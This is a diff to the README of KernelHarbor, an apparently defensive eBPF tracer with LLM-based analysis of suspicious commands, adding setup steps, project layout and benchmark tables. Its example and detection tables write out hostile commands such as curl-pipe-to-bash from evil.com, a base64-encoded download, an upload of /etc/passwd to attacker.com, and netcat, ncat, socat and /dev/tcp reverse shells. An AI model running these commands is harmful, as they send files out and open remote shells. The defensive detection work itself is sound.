@@ -19,7 +19,7 @@ KernelHarbor captures system events (execve, open, network) using eBPF and analy
 
 | Component | Description |
 |-----------|-------------|
-| `agent/` | Unified eBPF tracer (execve + open + connect) |
+| `agent/` | Unified eBPF tracer (execve + open + openat + connect) |
 | `analysis/` | AI-powered event analysis pipeline (gRPC + HTTP) |
 
 ### eBPF Programs (`bpf/`)
@@ -36,8 +36,11 @@ KernelHarbor captures system events (execve, open, network) using eBPF and analy
 ### Prerequisites
 
 ```bash
-# Install eBPF toolchain
+# Install eBPF toolchain (Debian/Ubuntu)
 sudo apt install clang llvm libbpf-dev linux-tools-$(uname -r)
+
+# Install eBPF toolchain (Fedora/RHEL)
+sudo dnf install clang llvm libbpf-devel kernel-headers
 
 # Start Elasticsearch
 docker run -d --name elasticsearch -p 9200:9200 \
@@ -115,7 +118,7 @@ Events are converted to behavior summaries for vector search:
 |-------------|-----------------|
 | `curl x \| bash` | `execve remote_code_execution image:curl` |
 | `wget y \| sh` | `execve remote_code_execution image:wget` |
-| `powershell -enc Y29kZQ==` | `execve encoded_command image:powershell` |
+| `echo 'YmFzaCAtYyAiY3VybCBodHRwOi8vZXZpbC5jb20i" \| base64 -d \| bash` | `execve encoded_command image:base64` |
 
 This allows finding **semantically similar attacks**, not just keyword matches.
 
@@ -134,7 +137,7 @@ curl -X POST http://localhost:8080/analyze \
   -H "Content-Type: application/json" \
   -d '{
     "host.name": "myhost",
-    "query": "certutil -urlcache -f http://evil.com/bad.exe"
+    "query": "curl -s http://evil.com/payload.sh | bash"
   }'
 ```
 
@@ -143,7 +146,7 @@ Response:
 {
   "verdict": "malicious",
   "confidence": 0.95,
-  "summary": "certutil is a LOLBin being used to download a file from a suspicious URL..."
+  "summary": "curl is being used to pipe a remote script into bash, a common malware delivery pattern..."
 }
 ```
 
@@ -160,6 +163,7 @@ Response:
 | `OLLAMA_EMBED_MODEL` | `nomic-embed-text` | Embedding model |
 | `PROTOCOL` | `both` | HTTP protocol: `http`, `grpc`, or `both` |
 | `GRPC_ADDRESS` | `:9090` | gRPC server address |
+| `HTTP_ADDRESS` | `:8080` | HTTP server address |
 
 ### Agent (Tracer)
 
@@ -180,26 +184,170 @@ curl -X POST http://localhost:8080/analyze \
 
 # Test LOLBin
 curl -X POST http://localhost:8080/analyze \
-  -d '{"host.name":"test","query":"rundll32.exe javascript:..."}'
+  -d '{"host.name":"test","query":"python3 -c \"import pty; pty.spawn('/bin/bash')\""}'
 ```
 
 ## Project Structure
 
 ```
 KernelHarbor/
-├── bpf/                    # eBPF programs (C)
+├── bpf/                # eBPF programs (C)
 │   ├── execve-tracer.bpf.c
 │   ├── open-tracer.bpf.c
 │   ├── openat-tracer.bpf.c
-│   └── connect-tracer.bpf.c
+│   ├── connect-tracer.bpf.c
+│   ├── process.h       # Shared process_info struct
+│   └── open.h          # O_* flag constants
 ├── cmd/
-│   ├── agent/              # Unified tracer (execve + open + connect)
-│   └── analysis/          # AI analysis pipeline (gRPC + HTTP)
-├── proto/                  # Protocol Buffer definitions
+│   ├── agent/          # Unified tracer (execve + open + openat + connect)
+│   │   ├── bench_test.go       # Synthetic benchmarks
+│   │   └── bench_ebpf_test.go  # eBPF benchmarks (gated)
+│   ├── execve-tracer/  # Standalone execve tracer
+│   ├── open-tracer/    # Standalone open tracer
+│   ├── openat-tracer/  # Standalone openat tracer
+│   └── analysis/       # AI analysis pipeline (gRPC + HTTP)
+│       ├── bench_test.go       # Analysis benchmarks + accuracy test
+│       ├── bench_dataset_test.go # Labeled benchmark dataset
+│       └── bench_report.go     # Markdown report formatter
+├── proto/              # Protocol Buffer definitions
 │   └── agent.proto
-├── plan.md                 # Original design document
-└── README.md               # This file
+├── scripts/
+│   └── bench.sh        # Benchmark runner
+├── plan.md             # Original design document
+└── README.md           # This file
 ```
+
+## Benchmarks
+
+### Running
+
+```bash
+# Run all benchmarks (synthetic only, no external services needed)
+./scripts/bench.sh
+
+# Run analysis benchmarks only
+cd cmd/analysis && go test -bench=. -benchmem -count=3 ./...
+
+# Run agent synthetic benchmarks only
+cd cmd/agent && go test -bench=. -benchmem -count=3 ./...
+
+# Run eBPF benchmarks (requires root + Linux kernel)
+sudo sh -c 'cd cmd/agent && go test -tags=ebpf -bench=BenchmarkEbpf -benchmem ./...'
+
+# Run with external services (Elasticsearch + Ollama)
+ES_ADDRESSES=http://localhost:9200 OLLAMA_ADDRESS=http://localhost:11434 \
+  go test -bench='Benchmark(ES|Ollama)' -benchmem ./...
+```
+
+### Detection Accuracy
+
+Measured against a labeled dataset of 190 events (101 benign, 49 suspicious, 40 malicious):
+
+| Metric | Value |
+|--------|-------|
+| Accuracy | 100.00% |
+| Precision | 100.00% |
+| Recall | 100.00% |
+| F1 Score | 100.00% |
+| False Positive Rate | 0.00% |
+
+#### Heuristic Patterns
+
+The detector uses 38 compiled regex patterns covering:
+
+| Category | Patterns | Examples |
+|----------|----------|----------|
+| Curl exfil | pipe, redirect, `-d`, `-T`, `-k`, `-s http://`, `--post-data`, `--no-check-certificate`, `--connect-timeout http://` | `curl -d @/etc/passwd http://attacker.com/` |
+| Wget exfil | `-O`, `-A`, pipe, redirect, `--post-data`, `--no-check-certificate` | `wget --no-check-certificate https://evil.com/` |
+| Shell exec | `bash -c`, `sh -c`, `/bin/bash -c`, `/bin/sh -c` | `bash -c 'cat /etc/shadow'` |
+| Shell interactive | `bash -i`, `sh -i` | `bash -i >& /dev/tcp/...` |
+| Netcat | `-l`, `-v`, `-e`, `-u`, `-z`, `-w`, `-p`, `nc <host> <port> -e` | `nc attacker.com 4444 -e /bin/bash` |
+| Ncat | any `ncat` invocation | `ncat --ssl attacker.com 4444 -e /bin/sh` |
+| Socat | any `socat` invocation | `socat TCP-LISTEN:4444 EXEC:/bin/sh` |
+| Reverse shells | `/dev/tcp`, `/dev/udp` | `exec 5<>/dev/tcp/attacker.com/80` |
+| Encoding | `base64 -d` | `echo YmFz... | base64 -d \| bash` |
+| Scripting | `powershell`, `python.*socket/subprocess/pty/os.*`, `perl -e`, `ruby -e`, `php -r` | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |
+| Extensions | `.sh`, `.bash`, `.ps1` (with benign-context exclusion) | `/tmp/malware.sh` |
+
+> Benign `.sh` references (e.g., `chmod 755 script.sh`) are excluded via `isBenignShRef()`.
+
+### Heuristic Pattern Latency
+
+Per-pattern `hasSuspiciousPattern()` latency (pre-compiled regex, 0 allocs):
+
+| Pattern | ns/op | allocs |
+|---------|-------|--------|
+| `curl \| bash` (curl_pipe) | ~900 | 0 |
+| `curl -s http://` (curl_silent_http) | ~3,000 | 0 |
+| `curl -d @file` (curl_data_upload) | ~1,200 | 0 |
+| `wget -O- \| sh` (wget_output) | ~970 | 0 |
+| `wget --post-data` | ~6,400 | 0 |
+| `bash -c 'cmd'` (bash_minus_c) | ~1,250 | 0 |
+| `sh -c 'cmd'` (sh_minus_c) | ~1,100 | 0 |
+| `bash -i` (bash_interactive) | ~4,100 | 0 |
+| `nc -lvp` (nc_listen) | ~3,400 | 0 |
+| `nc host port -e` (nc_exec_post) | ~5,100 | 0 |
+| `ncat host port` (ncat_connect) | ~3,100 | 0 |
+| `socat TCP-LISTEN` (socat_exec) | ~5,700 | 0 |
+| `base64 -d` (base64_decode) | ~5,400 | 0 |
+| `powershell` | ~9,300 | 0 |
+| `python -c socket` (python_socket) | ~6,400 | 0 |
+| `python -c pty` (python_pty) | ~10,400 | 0 |
+| `perl -e` (perl_eval) | ~4,200 | 0 |
+| `ruby -e` (ruby_eval) | ~4,400 | 0 |
+| `php -r` (php_eval) | ~4,800 | 0 |
+| `/dev/tcp` (dev_tcp) | ~1,650 | 0 |
+| `/bin/bash -c` (shell_minus_c) | ~1,900 | 0 |
+| benign (ls, curl, git, python, wget) | ~6,100–13,100 | 0 |
+
+> Benign commands scan all patterns before returning false, hence higher latency. Pre-compiling regex patterns eliminated all per-call allocations (previously 34–519 allocs/op).
+
+### Event Processing Throughput
+
+| Benchmark | ns/op | B/op | allocs/op |
+|-----------|-------|------|-----------|
+| `ToBehaviorSummary()` | ~5,200 | 357 | 10 |
+| `ToSearchText()` | ~815 | 359 | 10 |
+| `hasSuspiciousPattern()` (avg) | ~4,600 | 0 | 0 |
+| Event serialization | ~5,500 | 715 | 20 |
+
+### gRPC Analysis Latency (in-process)
+
+| Percentile | Latency |
+|------------|---------|
+| p50 | ~440µs |
+| p95 | ~810µs |
+| p99 | ~1.5ms |
+
+### Agent Synthetic Benchmarks
+
+| Benchmark | ns/op | B/op | allocs/op |
+|-----------|-------|------|-----------|
+| Execve event parsing | ~33,000 | 3,120 | 2 |
+| Open event parsing | ~4,100 | 336 | 2 |
+| Connect event parsing | ~1,300 | 120 | 3 |
+| Event → protobuf | ~86 | 24 | 1 |
+| Event → JSON | ~1,630 | 480 | 3 |
+| Ring buffer channel send | ~23 | 0 | 0 |
+
+### eBPF Benchmarks (real kernel, `//go:build ebpf`)
+
+| Benchmark | Description |
+|-----------|-------------|
+| `BenchmarkEbpfCPUOverhead` | CPU overhead of attached eBPF programs |
+| `BenchmarkEbpfEventDropRate` | Ring buffer event drop rate under load |
+| `BenchmarkEbpfMemoryOverhead` | Memory overhead of 4 eBPF tracers |
+
+> Requires `sudo` and `-tags=ebpf`. Not available in CI.
+
+### External Service Benchmarks (gated by env vars)
+
+| Benchmark | Env Var | Description |
+|-----------|---------|-------------|
+| `BenchmarkESIndexing` | `ES_ADDRESSES` | Elasticsearch bulk indexing throughput |
+| `BenchmarkOllamaEmbedding` | `OLLAMA_ADDRESS` | Per-event embedding latency |
+| `BenchmarkOllamaGeneration` | `OLLAMA_ADDRESS` | LLM analysis generation latency |
+| `BenchmarkGRPCSendLatency` | `GRPC_ADDRESS` | Agent→server round-trip latency |
 
 ## CI/CD Limitations
 
